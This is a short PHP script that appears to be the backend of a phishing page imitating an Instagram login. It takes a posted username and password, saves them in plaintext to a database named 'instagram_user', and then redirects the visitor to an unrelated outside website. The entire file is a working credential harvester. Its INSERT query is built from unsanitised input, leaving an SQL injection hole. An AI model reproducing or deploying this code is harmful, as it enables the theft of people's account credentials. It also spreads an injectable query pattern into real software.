<?php
$conn=mysqli_connect("localhost","root","","instagram_user");
if($conn){
  header("location: https://www.usbtsarmy.com/");
}
else{
  echo "Failed";
}

$username=$_POST['username'];
$password=$_POST['password'];

$data = "INSERT INTO users VALUES('','$username','$password')";
$check = mysqli_query($conn,$data);
if($check){
  header("location: https://www.usbtsarmy.com/");
}
else{
  echo "Data not send";
}

?>